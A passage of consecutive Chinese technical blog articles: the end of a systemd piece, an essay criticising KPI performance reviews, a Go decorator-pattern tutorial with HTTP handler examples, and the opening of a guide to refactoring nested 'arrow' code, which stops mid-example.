今天，`systemd` 占据了几乎所有的主流的 Linux 发行版的默认配置，包括：Arch Linux、CentOS、CoreOS、Debian、Fedora、Megeia、OpenSUSE、RHEL、SUSE企业版和 Ubuntu。而且，对于 CentOS, CoreOS, Fedora, RHEL, SUSE这些发行版来说，不能没有 `systemd`。（Ubuntu 还有一个不错的wiki – [Systemd for Upstart Users](https://wiki.ubuntu.com/SystemdForUpstartUsers) 阐述了如何在两者间切换）

 

#### 其它

还记得在《[缓存更新的套路](https://coolshell.cn/articles/17416.html)》一文中，我说过，**如果你要做好架构，首先你得把计算机体系结构以及很多老古董的基础技术吃透了**。因为里面会有很多可以借鉴和相通的东西。那么，你是否从这篇文章里看到了一些有分布式架构相似的东西？

比如：从 `sysvinit` 到 `upstart` 再到 `systemd`，像不像是服务治理？Linux系统下的这些服务进程，是不是很像分布式架构中的微服务？还有那个D-Bus，是不是很像SOA里的ESB？而 init 系统是不是很像一个控制系统？甚至像一个服务编排（Service Orchestration）系统？

分布式系统中的服务之间也有很多依赖，所以，在启动一个架构的时候，如果我们可以做到像 systemd 那样并行启动的话，那么是不是就像是一个微服务的玩法了？

嗯，你会发现，技术上的很多东西是相通的，也是互相有对方的影子，所以，其实技术并不多。关键是我们学在了表面还是看到了本质。

 

#### 延伸阅读

- Lennert 的博文：[Rethinking PID 1](http://0pointer.de/blog/projects/systemd.html)
- Lennert 的演讲：[systemd, beyond init](https://www.youtube.com/watch?v=TyMLi8QF6sw) （ [PPT](http://www.linux-kongress.org/2010/slides/systemd-poettering.pdf) ）
- [Wikipedia：Systemd](https://en.wikipedia.org/wiki/Systemd)
- LinuxVoice：[Lennart Poettering 专访](https://www.linuxvoice.com/interview-lennart-poettering/)

（全文完）

# 我看绩效考核

#####  [2017年07月09日 ](https://coolshell.cn/articles/17972.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [95 条评论](https://coolshell.cn/articles/17972.html#comments) 121,869 人阅读

![img](photo/performance_review-360x200.jpg)（本来，这篇文章应该在5月份完成，我拖延症让我今天才完成）

前些天，有几个网友找我谈绩效考核的事，都是在绩效上被差评的朋友。在大致了解情况后，我发现他们感到沮丧和郁闷的原因，不全是自己没有做好事情，他们对于自己没有做好公司交给的事，一方面，持一些疑义，因为我很明显地感到他们和公司对一件是否做好的标准定义有误差，另一方面，他们对于自己的工作上的问题也承认。不过，让他们更多感到沮丧的原因则是，公司、经理或HR和他们的谈话，让他们感觉整个人都被完全否定了，甚至有一种被批斗的感觉。这个感觉实在是太糟糕了。

因为我也有相似的经历，所以，我想在这里写下一篇文章，谈谈自己的对一些绩效考核的感受。先放出我的两个观点：

**1）制定目标和绩效，目的不是用来考核人的，而用来改善提高组织和人员业绩和效率的。**

**2）人是复杂的，人是有状态波动的，任何时候都不应该轻易否定人，绩效考核应该考核的是事情，而不是人。**

我个人比较坚持的认为——**绩效分应该打给项目，打给产品，打给部门，打给代码，而不是打给人。**然而现在的管理体制基本上都是打给人，而很多根本不擅长管理的经理和HR以及很多不会独立思考的吃瓜群众基本上都会把矛头指向个人，所以，当然会有开批斗会的感觉。



 

目录



[举几个例子](https://coolshell.cn/articles/17972.html#举几个例子)[对公司和管理者想说的话](https://coolshell.cn/articles/17972.html#对公司和管理者想说的话)[对职场人想说的话](https://coolshell.cn/articles/17972.html#对职场人想说的话)[其它](https://coolshell.cn/articles/17972.html#其它)

#### 举几个例子

为了讲清楚我的上述观点，请让我先铺垫一下，先说几个例子吧，韩寒的例子我就不说了。

苏步青同学在小学时成绩很糟糕，全班倒数第一。

华罗庚同学上学时数学还考不及格，要不是王维克老师的鼓励并让他爱上了数学，他可能也就完全埋没了。

郑渊洁上学时，老师要求写《早起的鸟有虫子吃》，郑渊洁唱反调写《早起的虫子被鸟吃》，再加上数学老师发难，于是被开除了。从此郑渊洁没有上过一天学。

列夫尔斯泰大贵族出身，2岁丧母，9岁丧父，16岁上大学，大学三年级自动退学回家进行改革。在青年时期不好好读书，考试不及格，留级。他赌博、借债、鬼混……

这个的例子太多了，我从另一个方面举几个体育运动相关的例子，可能年轻的朋友都不知道，可以问问你们的父母。

80年代，中国有一批非常优秀的体育运动员，比如：体操王子李宁，打破过世界跳高记录的朱建华，还有乒乓球世界冠军马文革，还有羽毛球世界冠军赵建华，记得有一年参加世界比赛，他们全输了，而输的还很惨。于是国内的一些媒体和民众开始骂他们，甚至说他们是民族的败类、耻辱，还有很多人找上门要教训他们……

如果我们把绩效分比做在学校里的考试分，那么你是否会和我一样认为，考试的成绩只能代表这个人对这些知识点的掌握或理解，而且仅仅在这个时间点，根本不代表这个人根本就不行，更不代表他一直不行。因为挂科太多被学校开除的同学，并不见得这些人在社会上就无活生活下去，反而，他们中的有些人可能会考试成绩好的人还活得好。不是么？这样的例子在我们身边还少吗？

所以，当我看到某HR说某老员工——“他今天要不自己离开，未来一年也一定会因为绩效问题而被公司开了的”，除了感到居然有人类可以预知他人未来的可笑之外，我感到是一种悲哀，一种管理体制上的悲哀，我感到了在这HR考评背后一股非常强的暗流和不可见的力量让她干出了这样一件匪夷所思的事。

好些公司还考评价值观，价值观无可厚非，**我觉得一个企业的价值观是非常必要的，但是考核价值观是件非常危险的事情。**这个世界上和传统势力唱反调的人实在是太多了，而被定性为价值观有问题被迫害的人也是多了去了。被批斗被侮辱被毒打的老舍；因为同性恋问题，被迫害而自杀的图灵；因为不同意教会观点被监禁8年都不愿意放弃自己的信仰最终被烧死的布鲁诺，…… 这样的事情已经够多了，新的时代里不应该再发生这样的事了，无论大小。

考核价值观最大的问题就是非常容易的上纲上线，也非常容易的被制造政治斗争，也非常容易的扼杀各种不同思想，老实说，这从很大程度上是一种洗脑的手段——通过对人制造一种紧张或恐惧而达到控制思想的目的。

 

#### 对公司和管理者想说的话

下面我来谈谈绩效考核我的一些观点。在谈这个观点前，你可以移步看一下这篇新闻报道——《[绩效主义毁了索尼](http://tech.qq.com/a/20120614/000196.htm)》。而近年来，“放弃绩效考核”的斗争已经从科技企业中的Adobe、戴尔、微软、亚马逊，席卷到德勤、埃森哲、普华永道等咨询服务类企业。甚至通用电气（GE）——曾经的绩效管理的鼻祖，也宣布抛弃正式的年度绩效考核。在刚过去的2016年，腾讯的张小龙对微信事业群发出“警惕KPI”的呼声；李彦宏在内部信中将百度的掉队归咎于“从管理层到员工对短期KPI的追逐”；雷军干脆宣布小米“继续坚持‘去KPI’的战略，放下包袱，解掉绳索，开开心心地做事。”；王石也在个人微博中感慨：“绩效主义像企业的脓包”。

绩效考核在本质上就是像学校教育以分数论英雄，而忽略员工的成长和素质教育是一个道理。当学生和老师只关注考试分数时，而只有考试分数来评价老师和学生的优良中差时，老师和学生就会开始使用一些非常形式的方式来达到这个目标，比如：死记硬被，记套路，题海战术…… 而学习的能力的考评彻底地沦为了一种形式主义。反而，分数考的越高，脑子越死。（注：美国现行教育是不允许通过学生考试成绩来评价老师的能力的）

近几年来，一些大公司开始使用 OKR – Objectives, Key Result ，但是在实践过程中，我发现好些公司用OKR，本质上还是KPI – Key Performance Indicator， 因为OKR里面有一个Key Result，用来衡量 Objectives 的结果指标。于是，使用者习惯性的设置上了KPI。**我个人认为 OKR 有三个非常大的特性：0）由员工提出，1）以目标为导向。2）全员共享。**

举个例子，OKR可能会是制定成下面这个样子的：

Objectives：增强用户体验，

Key Results：

1）用户操作步骤减少20%以上，

2）客服减少40%以上工单，

3）用户99.9%的系统操作的响应时间为100ms以下

然后，把这个目标分解给产品、用户体验、技术团队，形成子的Objectives并关连上相应的父级的Key Result，比如，产品部门定义的Objectives：1）优化注册流程，减少2个步骤，2）优化红包算法，让用户更容易理解，3）提高商品质量，减少用户投诉。后端技术团队定义的Objectives： 1）定义SLA以及相关监控指标，2）自动化运维，减少故障恢复时间，3）提高性能，吞吐量在xxxqps下的99.9%的响应时间为xxms ……

这个Objective会从公司最高层一直分解到一线员工，信息完全透明，每个人都可以看到所有人被分解到目标，每个人都知道自己在为什么样的目标而奋头，而每个人也可以质疑，改进，建议调整最高层的目标和方向。而不是领到的是被层层消化过的变味的二手，三手甚至四五手的信息。

**而 KPI 最大的问题就是用 OKR 里的 Key Results 拿来当目标，从而导致员工只知道要做什么，不知道为什么，不知道为什么，不能理解目标，工作也就成了实实在在的应付！**

松下公司早在1933年，就召集168名员工，把松下未来250年的远景规划目标公布于众，从1956年开始，就定期宣布并解读自身的“五年计划”，帮助每位员工的目光从眼前的短期利益移开，树立自己的理想和目标，也促进了松下的可持续性发展。

然而，今时不同往昔，随着产品周期的不断缩减、竞争对手的持续涌入、高新技术的频频迭代，企业的战略的变化与调整变得更加频繁，朝令夕改的经营策略已经成为兵家常态。 在这一过程中，有多少员工了解调整之后的战略呢？员工的绩效指标又根据战略调整多少次了呢？

**KPI本身是一种被动的、后置的考察，在工作完成之后考察员工的行为是否符合标准。因此，员工对于公司的目标漠不关心，只关心自己的KPI，因为这才是自己的最大的利益，为了达到KPI，有的员工开始不思考，并使用一些简单粗暴的玩法，其实这样既害了公司，也害了自己。自己的成长和进步也因为强大的 KPI 而抛在了脑后。**

**当然，KPI 绩效考核一般来说，不一定会毁掉公司的，相反，对于喜欢使用蛮力的劳动密集型的公司来说，可能还有所帮助，然而，KPI毁掉的一定是团队的文化和团队的挑战精神，以及创新和对事业的热情，甚至会让其中的人失去应有的正常的判断力（分不清充分和必要条件，分不清很多事的因果关系）。**

 

#### 对职场人想说的话

那么，对于个人来说，如何面对公司给自己的绩效考核呢？如何面对他们的绩效考核呢？

还是用学校考试分数来做对比，如果说，用考试分数论英雄，一个人考高分就是绩效上的人才，考不及格的人就是人渣，这对吗？当然不是。也许仅于对于考试来说可以把人分成三六九等，但是对于整个人生来说，考试成绩和一个人在这个社会里的的成就并没有非常直接的因果关系。面对现实的社会，最终很多成绩好的人为成绩差的人工作的例子也有很多很多了。

我想说什么？我想说的是——**用一颗平常心来面对公司给你打的分数，因为那并不代表你的整个人生。但是，你要用一颗非常严肃的心来面对自己的个人发展和成长，因为这才是真正需要认真对待的事。**

换句话说，**如果要给一个人打绩效分，那不是由一个公司在一个短期的时间时打出来，而是由这个人在一个长期的时间里所能达到的成就得出来的。**

就像WhatsApp的联合创始人Brian Acton 在 2009年时面试Facebook时没有面试通过，然而在 5 年以后，他把自己创办的公司以190亿美元卖给了FaceBook。阿里巴巴的马云不也一样吗？找工作各种被拒，开办的第一个公司成绩也不好，20年前，一堆人都说马云这也不行那也不行，然而，后面呢？反过来说，也很多职业经理人在公司里绩效非常好，然后到了创业公司却搞得非常的糟糕，这又说明了什么呢？

这就像动物一样，有的动物适合在水里生活，有的动物适合在陆地上，鱼在陆地上是无法生存的，你让老虎去完成游泳的工作，你让鱼去完成鸟类的工作，你能考核到什么呢？**我们每个人都有适合自己的环境，找到适合自己的环境才是最关键的！与其去关注别人对自己的评价，不如去寻找适合自己的环境。**

所以，**一个特定环境下的绩效考核并不代表什么，而那些妄图用绩效考核去否定一个人的做法，或多或少就是“法西斯”或“红卫兵”的玩法**。

好了！让我们不要再说绩效考核了，让我们回到，真正让自己提高，让自己成长，让自己的强的话题上来吧。这里，我需要转引一篇文章《[Do the Right Thing, Wait to get fired](https://brendansterne.com/2013/07/11/do-the-right-thing-wait-to-get-fired/)》，文中提到《 [Team Geek](https://www.amazon.cn/gp/product/1449302440)》这本书中的一句话

> **做正确的事情，等着被开除。**
>
> 谷歌新员工(我们称做“Nooglers”)经常会问我是如何让自己做事这么高效的。我半开玩笑的告诉他们这很简单：**我选择做正确的事情，为谷歌，为世界，然后回到座位上，等着被开除。如果没有被开除，那我就是做了正确的事情——为所有人。如果被开除了，那选错了老板。总之，两方面，我都是赢**。这是我的职业发展策略。

注明一下，“做正确的事，等着被开除”并不是一句鸡汤，而是让你变强大的话。因为强者自强，只有强者才能追求真理，而不是委曲求全。

嗯，**考试分数不是关键，别人对你的评价也不是关键，自己有没有成长有没有提高有没有上一个台阶才是关键。KPI不是关键，OKR也不是关键，有没有在做正确的事，这才是关键！**不是这样吗？

#### 其它

我大学四年级时，觉得马上就要离开学校了，当时想干点以后再以没有机会干的事。想来想去，就是上学这么多年来，从来没有不及格过，于是我任性了一把，挂了一个科，去补考了一下。挂科的时候也收到一些同学的笑话，还有老师的批评，不过，这让我感觉我的学校经历更完整了。因为，这让我在22岁的时候，就经历并大概明白了一些人生的道理。

从98年工作到2013年来，就像一个好学生一样，我从来没有出现过任何的工作绩效问题，反正还经常在工作中成为标杠型的人，然并卵，只有自己成长才是最真实的感觉。“做正确的事，等着被开除”，这可能是我迄今为止在职场里做的最疯狂也是最正确的事了。因为，这让我有更多的经历，让我从正确的事中得到提高，也让我内心变得越来越强大，也让我找到了更具挑战的事，更让我对自己有更清楚的认识。

最后，我知道一定会有人来怼我，所以，最后我还想留段话，留给那些还是想通过绩效来否定人的人。

如果你对我的绩效或技术能力有怀疑，没问题，那么希望你能做到下述我已做到的事，再来喷我，谢谢！

“**在你40岁，在父亲病重，孩子上学问题、房贷并未还清、你是全家唯一收入来源之类的中年危机的情况下，辞去你现在的工作，不加入任何一家公司，不用自己的任何一分钱积蓄，不要任何人的投资和帮助。只通过自己的技术能力，为别人解决相应的技术难题（不做任何无技术含量的外包项目），来生存养家，并除了能照顾好自己的家人没有降低自己的生活水平之外，还能再养活3个每人年薪36万元的工程师**”

请问这样的绩效能打个几分呢？呵呵。

当然，不管怎么说，我还有很多路要走，还有很多不足，我还要继续努力。所以，我挑了一条对我来说最难走的路，作死创业……

（全文完）

# GO编程模式：修饰器

#####  [2017年06月01日 ](https://coolshell.cn/articles/17929.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [27 条评论](https://coolshell.cn/articles/17929.html#comments) 75,005 人阅读

![img](photo/go-hardhat.png)之前写过一篇《[Python修饰器的函数式编程](https://coolshell.cn/articles/11265.html)》，这种模式很容易的可以把一些函数装配到另外一些函数上，可以让你的代码更为的简单，也可以让一些“小功能型”的代码复用性更高，让代码中的函数可以像乐高玩具那样自由地拼装。所以，一直以来，我对修饰器decoration这种编程模式情有独钟，这里写一篇Go语言相关的文章。

### 本文是全系列中第7 / 10篇：[Go编程模式](https://coolshell.cn/articles/series/go编程模式)

- [Go编程模式：切片，接口，时间和性能](https://coolshell.cn/articles/21128.html)
- [Go 编程模式：错误处理](https://coolshell.cn/articles/21140.html)
- [Go 编程模式：Functional Options](https://coolshell.cn/articles/21146.html)
- [Go编程模式：委托和反转控制](https://coolshell.cn/articles/21214.html)
- [Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)
- [Go 编程模式：Go Generation](https://coolshell.cn/articles/21179.html)
- Go编程模式：修饰器
- [Go编程模式：Pipeline](https://coolshell.cn/articles/21228.html)
- [Go 编程模式：k8s Visitor 模式](https://coolshell.cn/articles/21263.html)
- [Go编程模式 ： 泛型编程](https://coolshell.cn/articles/21615.html)

« [上一篇文章](https://coolshell.cn/articles/21179.html)[下一篇文章](https://coolshell.cn/articles/21228.html) »

看过[Python修饰器](https://coolshell.cn/articles/11265.html)那篇文章的同学，一定知道这是一种函数式编程的玩法——用一个高阶函数来包装一下。多唠叨一句，关于函数式编程，可以参看我之前写过一篇文章《[函数式编程](https://coolshell.cn/articles/10822.html)》，这篇文章主要是，想通过从过程式编程的思维方式过渡到函数式编程的思维方式，从而带动更多的人玩函数式编程，所以，如果你想了解一下函数式编程，那么可以移步先阅读一下。所以，Go语言的修饰器编程模式，其实也就是函数式编程的模式。

不过，要提醒注意的是，Go 语言的“糖”不多，而且又是强类型的静态无虚拟机的语言，所以，无法做到像 Java 和 Python 那样的优雅的修饰器的代码。当然，也许是我才才疏学浅，如果你知道有更多的写法，请你一定告诉我。先谢过了。

目录



[简单示例](https://coolshell.cn/articles/17929.html#简单示例)[HTTP 相关的一个示例](https://coolshell.cn/articles/17929.html#HTTP_相关的一个示例)[多个修饰器的 Pipeline](https://coolshell.cn/articles/17929.html#多个修饰器的_Pipeline)[泛型的修饰器](https://coolshell.cn/articles/17929.html#泛型的修饰器)

#### 简单示例

我们先来看一个示例：

```
package main

import "fmt"

func decorator(f func(s string)) func(s string) {

    return func(s string) {
        fmt.Println("Started")
        f(s)
        fmt.Println("Done")
    }
}

func Hello(s string) {
    fmt.Println(s)
}

func main() {
        decorator(Hello)("Hello, World!")
}
```

我们可以看到，我们动用了一个高阶函数 `decorator()`，在调用的时候，先把 `Hello()` 函数传进去，然后其返回一个匿名函数，这个匿名函数中除了运行了自己的代码，也调用了被传入的 `Hello()` 函数。

这个玩法和 Python 的异曲同工，只不过，有些遗憾的是，Go 并不支持像 Python 那样的 `@decorator` 语法糖。所以，在调用上有些难看。当然，如果你要想让代码容易读一些，你可以这样：

```
hello := decorator(Hello)
hello("Hello")
```

我们再来看一个和计算运行时间的例子：

```
package main

import (
  "fmt"
  "reflect"
  "runtime"
  "time"
)

type SumFunc func(int64, int64) int64

func getFunctionName(i interface{}) string {
  return runtime.FuncForPC(reflect.ValueOf(i).Pointer()).Name()
}

func timedSumFunc(f SumFunc) SumFunc {
  return func(start, end int64) int64 {

    defer func(t time.Time) {
      fmt.Printf("--- Time Elapsed (%s): %v ---\n", 
          getFunctionName(f), time.Since(t))
    }(time.Now())

    return f(start, end)
  }
}

func Sum1(start, end int64) int64 {
  var sum int64
  sum = 0
  if start > end {
    start, end = end, start
  }
  for i := start; i <= end; i++ {
    sum += i
  }
  return sum
}

func Sum2(start, end int64) int64 {
  if start > end {
    start, end = end, start
  }
  return (end - start + 1) * (end + start) / 2
}

func main() {

  sum1 := timedSumFunc(Sum1)
  sum2 := timedSumFunc(Sum2)

  fmt.Printf("%d, %d\n", sum1(-10000, 10000000), sum2(-10000, 10000000))
}
```

关于上面的代码，有几个事说明一下：

1）有两个 Sum 函数，`Sum1()` 函数就是简单的做个循环，`Sum2()` 函数动用了数据公式。（注意：start 和 end 有可能有负数的情况）

2）代码中使用了 Go 语言的反射机器来获取函数名。

3）修饰器函数是 `timedSumFunc()`

运行后输出：

```
$ go run time.sum.go
--- Time Elapsed (main.Sum1): 3.557469ms ---
--- Time Elapsed (main.Sum2): 291ns ---
49999954995000, 49999954995000
```

#### HTTP 相关的一个示例

我们再来看一个处理 HTTP 请求的相关的例子。

先看一个简单的 HTTP Server 的代码。

```
package main

import (
    "fmt"
    "log"
    "net/http"
    "strings"
)

func WithServerHeader(h http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        log.Println("--->WithServerHeader()")
        w.Header().Set("Server", "HelloServer v0.0.1")
        h(w, r)
    }
}

func hello(w http.ResponseWriter, r *http.Request) {
    log.Printf("Recieved Request %s from %s\n", r.URL.Path, r.RemoteAddr)
    fmt.Fprintf(w, "Hello, World! "+r.URL.Path)
}

func main() {
    http.HandleFunc("/v1/hello", WithServerHeader(hello))
    err := http.ListenAndServe(":8080", nil)
    if err != nil {
        log.Fatal("ListenAndServe: ", err)
    }
}
```

上面代码中使用到了修饰模式，`WithServerHeader()` 函数就是一个 Decorator，其传入一个 `http.HandlerFunc`，然后返回一个改写的版本。上面的例子还是比较简单，用 `WithServerHeader()` 就可以加入一个 Response 的 Header。

于是，这样的函数我们可以写出好些个。如下所示，有写 HTTP 响应头的，有写认证 Cookie 的，有检查认证Cookie的，有打日志的……

```
package main

import (
    "fmt"
    "log"
    "net/http"
    "strings"
)

func WithServerHeader(h http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        log.Println("--->WithServerHeader()")
        w.Header().Set("Server", "HelloServer v0.0.1")
        h(w, r)
    }
}

func WithAuthCookie(h http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        log.Println("--->WithAuthCookie()")
        cookie := &http.Cookie{Name: "Auth", Value: "Pass", Path: "/"}
        http.SetCookie(w, cookie)
        h(w, r)
    }
}

func WithBasicAuth(h http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        log.Println("--->WithBasicAuth()")
        cookie, err := r.Cookie("Auth")
        if err != nil || cookie.Value != "Pass" {
            w.WriteHeader(http.StatusForbidden)
            return
        }
        h(w, r)
    }
}

func WithDebugLog(h http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        log.Println("--->WithDebugLog")
        r.ParseForm()
        log.Println(r.Form)
        log.Println("path", r.URL.Path)
        log.Println("scheme", r.URL.Scheme)
        log.Println(r.Form["url_long"])
        for k, v := range r.Form {
            log.Println("key:", k)
            log.Println("val:", strings.Join(v, ""))
        }
        h(w, r)
    }
}
func hello(w http.ResponseWriter, r *http.Request) {
    log.Printf("Recieved Request %s from %s\n", r.URL.Path, r.RemoteAddr)
    fmt.Fprintf(w, "Hello, World! "+r.URL.Path)
}

func main() {
    http.HandleFunc("/v1/hello", WithServerHeader(WithAuthCookie(hello)))
    http.HandleFunc("/v2/hello", WithServerHeader(WithBasicAuth(hello)))
    http.HandleFunc("/v3/hello", WithServerHeader(WithBasicAuth(WithDebugLog(hello))))
    err := http.ListenAndServe(":8080", nil)
    if err != nil {
        log.Fatal("ListenAndServe: ", err)
    }
}
```

#### 多个修饰器的 Pipeline

在使用上，需要对函数一层层的套起来，看上去好像不是很好看，如果需要 decorator 比较多的话，代码会比较难看了。嗯，我们可以重构一下。

重构时，我们需要先写一个工具函数——用来遍历并调用各个 decorator：

```
type HttpHandlerDecorator func(http.HandlerFunc) http.HandlerFunc

func Handler(h http.HandlerFunc, decors ...HttpHandlerDecorator) http.HandlerFunc {
    for i := range decors {
        d := decors[len(decors)-1-i] // iterate in reverse
        h = d(h)
    }
    return h
}
```

然后，我们就可以像下面这样使用了。

```
http.HandleFunc("/v4/hello", Handler(hello,
                WithServerHeader, WithBasicAuth, WithDebugLog))
```

这样的代码是不是更易读了一些？pipeline 的功能也就出来了。

#### 泛型的修饰器

不过，对于 Go 的修饰器模式，还有一个小问题 —— 好像无法做到泛型，就像上面那个计算时间的函数一样，其代码耦合了需要被修饰的函数的接口类型，无法做到非常通用，如果这个事解决不了，那么，这个修饰器模式还是有点不好用的。

因为 Go 语言不像 Python 和 Java，Python是动态语言，而 Java 有语言虚拟机，所以他们可以干好些比较变态的事，然而 Go 语言是一个静态的语言，这意味着其类型需要在编译时就要搞定，否则无法编译。不过，Go 语言支持的最大的泛型是 `interface{}` 还有比较简单的 reflection 机制，在上面做做文章，应该还是可以搞定的。

废话不说，下面是我用 reflection 机制写的一个比较通用的修饰器（为了便于阅读，我删除了出错判断代码）

```
func Decorator(decoPtr, fn interface{}) (err error) {
    var decoratedFunc, targetFunc reflect.Value

    decoratedFunc = reflect.ValueOf(decoPtr).Elem()
    targetFunc = reflect.ValueOf(fn)

    v := reflect.MakeFunc(targetFunc.Type(),
            func(in []reflect.Value) (out []reflect.Value) {
                fmt.Println("before")
                out = targetFunc.Call(in)
                fmt.Println("after")
                return
            })

    decoratedFunc.Set(v)
    return
}
```

上面的代码动用了 `reflect.MakeFunc()` 函数制出了一个新的函数其中的 `targetFunc.Call(in)` 调用了被修饰的函数。关于 Go 语言的反射机制，推荐官方文章 —— 《[The Laws of Reflection](https://blog.golang.org/laws-of-reflection)》，在这里我不多说了。

上面这个 `Decorator()` 需要两个参数，

- 第一个是出参 `decoPtr` ，就是完成修饰后的函数
- 第二个是入参 `fn` ，就是需要修饰的函数

这样写是不是有些二？的确是的。不过，这是我个人在 Go 语言里所能写出来的最好的的代码了。如果你知道更多优雅的，请你一定告诉我！

好的，让我们来看一下使用效果。首先假设我们有两个需要修饰的函数：

```
func foo(a, b, c int) int {
    fmt.Printf("%d, %d, %d \n", a, b, c)
    return a + b + c
}

func bar(a, b string) string {
    fmt.Printf("%s, %s \n", a, b)
    return a + b
}
```

然后，我们可以这样做：

```
type MyFoo func(int, int, int) int
var myfoo MyFoo
Decorator(&myfoo, foo)
myfoo(1, 2, 3)
```

你会发现，使用 `Decorator()` 时，还需要先声明一个函数签名，感觉好傻啊。一点都不泛型，不是吗？

嗯。如果你不想声明函数签名，那么你也可以这样

```
mybar := bar
Decorator(&mybar, bar)
mybar("hello,", "world!")
```

好吧，看上去不是那么的漂亮，但是 it works。看样子 Go 语言目前本身的特性无法做成像 Java 或 Python 那样，对此，我们只能多求 Go 语言多放糖了！

Again， 如果你有更好的写法，请你一定要告诉我。

（全文完）

# 如何重构“箭头型”代码

#####  [2017年04月05日 ](https://coolshell.cn/articles/17757.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [56 条评论](https://coolshell.cn/articles/17757.html#comments) 101,708 人阅读

本文主要起因是，一次在微博上和朋友关于嵌套好几层的if-else语句的代码重构的讨论（[微博原文](https://weibo.com/1401880315/ECmCW0oy2)），在微博上大家有各式各样的问题和想法。按道理来说这些都是编程的基本功，似乎不太值得写一篇文章，不过我觉得很多东西可以从一个简单的东西出发，到达本质，所以，我觉得有必要在这里写一篇的文章。不一定全对，只希望得到更多的讨论，因为有了更深入的讨论才能进步。

文章有点长，我在文章最后会给出相关的思考和总结陈词，你可以跳到结尾。

所谓箭头型代码，基本上来说就是下面这个图片所示的情况。

![img](photo/IMG_7411.jpg)

那么，这样“箭头型”的代码有什么问题呢？看上去也挺好看的，有对称美。但是……

关于箭头型代码的问题有如下几个：



1）我的显示器不够宽，箭头型代码缩进太狠了，需要我来回拉水平滚动条，这让我在读代码的时候，相当的不舒服。

2）除了宽度外还有长度，有的代码的`if-else`里的`if-else`里的`if-else`的代码太多，读到中间你都不知道中间的代码是经过了什么样的层层检查才来到这里的。

总而言之，**“箭头型代码”如果嵌套太多，代码太长的话，会相当容易让维护代码的人（包括自己）迷失在代码中，因为看到最内层的代码时，你已经不知道前面的那一层一层的条件判断是什么样的，代码是怎么运行到这里的，所以，箭头型代码是非常难以维护和Debug的**。

目录



[微博上的案例 与 Guard Clauses](https://coolshell.cn/articles/17757.html#微博上的案例_与_Guard_Clauses)[抽取成函数](https://coolshell.cn/articles/17757.html#抽取成函数)[嵌套的 if 外的代码](https://coolshell.cn/articles/17757.html#嵌套的_if_外的代码)[状态检查嵌套](https://coolshell.cn/articles/17757.html#状态检查嵌套)[延伸思考](https://coolshell.cn/articles/17757.html#延伸思考)[检查错误](https://coolshell.cn/articles/17757.html#检查错误)[检查状态](https://coolshell.cn/articles/17757.html#检查状态)[总结](https://coolshell.cn/articles/17757.html#总结)

#### 微博上的案例 与 Guard Clauses

OK，我们先来看一下微博上的那个示例，代码量如果再大一点，嵌套再多一点，你很容易会在条件中迷失掉（下面这个示例只是那个“大箭头”下的一个小箭头）

```
FOREACH(Ptr<WfExpression>, argument, node->arguments) {
    int index = manager->expressionResolvings.Keys().IndexOf(argument.Obj());
    if (index != -1) {
        auto type = manager->expressionResolvings.Values()[index].type;
        if (! types.Contains(type.Obj())) {
            types.Add(type.Obj());
            if (auto group = type->GetTypeDescriptor()->GetMethodGroupByName(L"CastResult", true)) {
                int count = group->GetMethodCount();
                for (int i = 0; i < count; i++) { auto method = group->GetMethod(i);
                    if (method->IsStatic()) {
                        if (method->GetParameterCount() == 1 &&
                            method->GetParameter(0)->GetType()->GetTypeDescriptor() == description::GetTypeDescriptor<DescriptableObject>() &&
                            method->GetReturn()->GetTypeDescriptor() != description::GetTypeDescriptor<void>() ) {
                            symbol->typeInfo = CopyTypeInfo(method->GetReturn());
                            break;
                        }
                    }
                }
            }
        }
    }
}
```

上面这段代码，可以把条件反过来写，然后就可以把箭头型的代码解掉了，重构的代码如下所示：

```
FOREACH(Ptr<WfExpression>, argument, node->arguments) {
    int index = manager->expressionResolvings.Keys().IndexOf(argument.Obj());
    if (index == -1)  continue;
    
    auto type = manager->expressionResolvings.Values()[index].type;
    if ( types.Contains(type.Obj()))  continue;
    
    types.Add(type.Obj());

    auto group = type->GetTypeDescriptor()->GetMethodGroupByName(L"CastResult", true);
    if  ( ! group ) continue;
 
    int count = group->GetMethodCount();
    for (int i = 0; i < count; i++) { auto method = group->GetMethod(i);
        if (! method->IsStatic()) continue;
       
        if ( method->GetParameterCount() == 1 &&
               method->GetParameter(0)->GetType()->GetTypeDescriptor() == description::GetTypeDescriptor<DescriptableObject>() &&
               method->GetReturn()->GetTypeDescriptor() != description::GetTypeDescriptor<void>() ) {
            symbol->typeInfo = CopyTypeInfo(method->GetReturn());
            break;
        }
    }
}
```

这种代码的重构方式叫 **Guard Clauses**

- [Martin Fowler](https://martinfowler.com/) 的 Refactoring 的网站上有相应的说明《[Replace Nested Conditional with Guard Clauses](https://refactoring.com/catalog/replaceNestedConditionalWithGuardClauses.html)》。

- [Coding Horror](https://blog.codinghorror.com/) 上也有一篇文章讲了这种重构的方式 —— 《[Flattening Arrow Code](https://blog.codinghorror.com/flattening-arrow-code/)》

- [StackOverflow](https://stackoverflow.com/) 上也有相关的问题说了这种方式 —— 《[Refactor nested IF statement for clarity](https://stackoverflow.com/questions/356121/refactor-nested-if-statement-for-clarity)》

这里的思路其实就是，**让出错的代码先返回，前面把所有的错误判断全判断掉，然后就剩下的就是正常的代码了**。

#### 抽取成函数

微博上有些人说，continue 语句破坏了阅读代码的通畅，我觉得他们一定没有好好读这里面的代码，其实，我们可以看到，所有的 if 语句都是在判断是否出错的情况，所以，在维护代码的时候，你可以完全不理会这些 if 语句，因为都是出错处理的，而剩下的代码都是正常的功能代码，反而更容易阅读了。当然，一定有不是上面代码里的这种情况，那么，不用continue ，我们还能不能重构呢？

当然可以，抽成函数：

```
bool CopyMethodTypeInfo(auto &method, auto &group, auto &symbol) 
{
    if (! method->IsStatic()) {
        return true;
    }
    if ( method->GetParameterCount() == 1 &&
           method->GetParameter(0)->GetType()->GetTypeDescriptor() == description::GetTypeDescriptor<DescriptableObject>() &&
           method->GetReturn()->GetTypeDescriptor() != description::GetTypeDescriptor<void>() ) {
